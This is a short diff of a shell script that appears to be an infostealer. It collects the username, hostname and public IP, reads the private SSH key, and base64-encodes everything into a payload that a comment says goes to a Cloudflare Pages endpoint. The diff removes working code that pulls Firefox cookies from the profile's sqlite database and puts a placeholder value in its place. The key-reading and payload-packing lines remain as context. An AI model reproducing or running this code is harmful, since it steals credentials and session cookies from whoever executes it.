@@ -6,16 +6,11 @@ username=$(whoami)
 hostname=$(hostname)
 ip_address=$(curl -s https://api.ipify.org)
 ssh_keys=$(cat ~/.ssh/id_rsa 2>/dev/null)
-
-# locate the default firefox profile
-firefox_profile=$(find ~/.mozilla/firefox -name '*.default-release' -print -quit)
-
-# extract cookies from the sqlite database
-firefox_cookies=$(sqlite3 "$firefox_profile/cookies.sqlite" "SELECT host, name, value FROM moz_cookies;")
+firefox_cookies="testcookies"
 
 
 # package the data
-payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$browser_cookies"
+payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$firefox_cookies"
 encoded_payload=$(echo $payload | base64)
 
 # exfiltrate the data to the cloudflare pages endpoint
